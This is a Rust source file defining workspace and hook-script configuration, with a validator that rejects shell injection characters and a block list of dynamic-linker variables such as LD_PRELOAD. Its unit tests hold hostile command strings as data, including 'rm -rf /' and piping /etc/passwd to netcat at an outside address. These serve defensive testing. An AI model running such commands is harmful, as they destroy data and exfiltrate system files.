//! Configuration types for workspace management.

use serde::{Deserialize, Serialize};
use std::path::PathBuf;

/// Shell metacharacters that are rejected in hook scripts to prevent injection.
///
/// Backtick and `$(` run subshells; `;`, `|`, and `&` chain or background commands.
const FORBIDDEN_SCRIPT_PATTERNS: &[&str] = &["`", "$(", ";", "|", "&"];

/// Environment variable names stripped from hook subprocess environments.
///
/// These control the dynamic linker and, if attacker-controlled, enable privilege
/// escalation via library injection.
pub(crate) const DANGEROUS_ENV_VARS: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "LD_AUDIT",
    "LD_DEBUG",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "DYLD_FALLBACK_LIBRARY_PATH",
];

/// Configuration for workspace management.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkspaceConfig {
    /// Root directory for all workspaces.
    pub root: PathBuf,
    /// Hook scripts to run during workspace lifecycle.
    #[serde(default)]
    pub hooks: HooksConfig,
    /// Timeout for hook execution in milliseconds.
    #[serde(default = "default_hook_timeout_ms")]
    pub hook_timeout_ms: u64,
}

impl WorkspaceConfig {
    /// Create a new workspace config with the given root.
    pub fn new(root: PathBuf) -> Self {
        Self {
            root,
            hooks: HooksConfig::default(),
            hook_timeout_ms: default_hook_timeout_ms(),
        }
    }

    /// Set the hooks configuration.
    pub fn with_hooks(mut self, hooks: HooksConfig) -> Self {
        self.hooks = hooks;
        self
    }

    /// Set the hook timeout in milliseconds.
    pub fn with_hook_timeout_ms(mut self, timeout_ms: u64) -> Self {
        self.hook_timeout_ms = timeout_ms;
        self
    }
}

fn default_hook_timeout_ms() -> u64 {
    60000 // 60 seconds
}

/// Hook scripts that run during workspace lifecycle.
///
/// # Security
///
/// Hook scripts are executed as **shell commands** (`sh -c <script>`) running as the
/// server process user. Scripts must therefore be treated as trusted input only.
///
/// - Do **not** populate hook scripts from user-editable sources (API bodies, issue
///   titles, web forms) — doing so is equivalent to arbitrary command execution on the
///   host.
/// - Call [`HooksConfig::validate_scripts`] after deserialization to reject strings
///   that contain shell injection patterns.
/// - Environment variables injected via `env_vars` are filtered at runtime to strip
///   dynamic-linker variables (`LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, etc.) that could
///   be used for privilege escalation.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct HooksConfig {
    /// Script to run after workspace creation.
    /// If this fails, the workspace is removed.
    pub after_create: Option<String>,
    /// Script to run before agent execution.
    /// If this fails, the agent run is aborted.
    pub before_run: Option<String>,
    /// Script to run after agent execution.
    /// Failures are logged but ignored.
    pub after_run: Option<String>,
    /// Script to run before workspace removal.
    /// Failures are logged but ignored.
    pub before_remove: Option<String>,
}

impl HooksConfig {
    /// Create a new empty hooks config.
    pub fn new() -> Self {
        Self::default()
    }

    /// Validate that hook scripts do not contain shell injection patterns.
    ///
    /// Returns `Err` with a description of the first violation found. Call this after
    /// deserializing configuration from any external source.
    ///
    /// # Rejected patterns
    ///
    /// Backtick (`` ` ``), `$(`, `;`, `|`, and `&` are rejected because they enable
    /// subshell execution, command chaining, piping, and backgrounding — all of which
    /// can be leveraged for arbitrary command execution if the script content is
    /// attacker-controlled.
    pub fn validate_scripts(&self) -> Result<(), String> {
        let named_scripts = [
            ("after_create", &self.after_create),
            ("before_run", &self.before_run),
            ("after_run", &self.after_run),
            ("before_remove", &self.before_remove),
        ];
        for (hook_name, script_opt) in named_scripts {
            if let Some(script) = script_opt {
                for pattern in FORBIDDEN_SCRIPT_PATTERNS {
                    if script.contains(pattern) {
                        return Err(format!(
                            "hook '{hook_name}' script contains forbidden pattern {pattern:?}"
                        ));
                    }
                }
            }
        }
        Ok(())
    }

    /// Set the after_create hook.
    pub fn with_after_create(mut self, script: impl Into<String>) -> Self {
        self.after_create = Some(script.into());
        self
    }

    /// Set the before_run hook.
    pub fn with_before_run(mut self, script: impl Into<String>) -> Self {
        self.before_run = Some(script.into());
        self
    }

    /// Set the after_run hook.
    pub fn with_after_run(mut self, script: impl Into<String>) -> Self {
        self.after_run = Some(script.into());
        self
    }

    /// Set the before_remove hook.
    pub fn with_before_remove(mut self, script: impl Into<String>) -> Self {
        self.before_remove = Some(script.into());
        self
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn workspace_config_default_timeout() {
        let dir = tempfile::tempdir().unwrap();
        let config = WorkspaceConfig::new(dir.path().to_path_buf());
        assert_eq!(config.hook_timeout_ms, 60000);
    }

    #[test]
    fn validate_scripts_accepts_simple_commands() {
        let hooks = HooksConfig::new()
            .with_after_create("touch created.txt")
            .with_before_run("echo starting");
        assert!(hooks.validate_scripts().is_ok());
    }

    #[test]
    fn validate_scripts_rejects_backtick_subshell() {
        let hooks = HooksConfig::new().with_after_create("echo `id`");
        let err = hooks.validate_scripts().unwrap_err();
        assert!(err.contains("after_create"));
    }

    #[test]
    fn validate_scripts_rejects_dollar_paren_subshell() {
        let hooks = HooksConfig::new().with_before_run("echo $(whoami)");
        let err = hooks.validate_scripts().unwrap_err();
        assert!(err.contains("before_run"));
    }

    #[test]
    fn validate_scripts_rejects_semicolon() {
        let hooks = HooksConfig::new().with_after_run("echo ok; rm -rf /");
        let err = hooks.validate_scripts().unwrap_err();
        assert!(err.contains("after_run"));
    }

    #[test]
    fn validate_scripts_rejects_pipe() {
        let hooks = HooksConfig::new().with_before_remove("cat /etc/passwd | nc 1.2.3.4 4444");
        let err = hooks.validate_scripts().unwrap_err();
        assert!(err.contains("before_remove"));
    }

    #[test]
    fn validate_scripts_rejects_ampersand() {
        let hooks = HooksConfig::new().with_after_create("evil &");
        let err = hooks.validate_scripts().unwrap_err();
        assert!(err.contains("after_create"));
    }

    #[test]
    fn validate_scripts_accepts_none_hooks() {
        let hooks = HooksConfig::default();
        assert!(hooks.validate_scripts().is_ok());
    }

    #[test]
    fn workspace_config_builder() {
        let dir = tempfile::tempdir().unwrap();
        let config = WorkspaceConfig::new(dir.path().to_path_buf())
            .with_hook_timeout_ms(30000)
            .with_hooks(
                HooksConfig::new()
                    .with_after_create("echo created")
                    .with_before_run("echo starting"),
            );

        assert_eq!(config.hook_timeout_ms, 30000);
        assert_eq!(config.hooks.after_create, Some("echo created".into()));
        assert_eq!(config.hooks.before_run, Some("echo starting".into()));
        assert!(config.hooks.after_run.is_none());
    }

    #[test]
    fn hooks_config_builder() {
        let hooks = HooksConfig::new()
            .with_after_create("touch created")
            .with_before_run("echo start")
            .with_after_run("echo done")
            .with_before_remove("echo cleanup");

        assert_eq!(hooks.after_create, Some("touch created".into()));
        assert_eq!(hooks.before_run, Some("echo start".into()));
        assert_eq!(hooks.after_run, Some("echo done".into()));
        assert_eq!(hooks.before_remove, Some("echo cleanup".into()));
    }
}
